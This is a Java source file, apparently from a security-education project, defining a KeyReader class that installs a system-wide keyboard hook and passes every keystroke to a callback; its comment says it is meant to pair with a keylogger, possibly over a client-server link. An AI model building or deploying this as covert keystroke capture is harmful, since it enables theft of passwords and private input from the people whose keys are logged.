package org.insecurity_quiz.Advanced_Security_Implementations;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.function.Function;

/**
 * KeyReader for keyboard events using the NativeKeyListener interface and calls a given function when a key is pressed.
 * It listens to the key, and then executes whatever function you want executed given the key is pressed.
 * Meant to be paired with the Keylogger, perhaps over a client-server connection?
 */
public class KeyReader implements NativeKeyListener {
    private Function<String, Boolean> onKeyPress;

    /**
     * Constructs a new instance of the KeyReader class with a function that will be called when a key is pressed.
     *
     * @param onKeyPress a function that takes a String representing the pressed key and returns a Boolean indicating function use success.
     * @throws IOException if there was a problem registering the native hook.
     * @throws NativeHookException if there was a problem registering the native hook.
     */
    public KeyReader(Function<String, Boolean> onKeyPress) throws IOException, NativeHookException {
        this.onKeyPress = onKeyPress;
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(this);
    }

    /**
     * Called when a key is pressed.
     *
     * @param nativeEvent the key event that occurred.
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        String keytext = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
        onKeyPress.apply(keytext);
    }
}
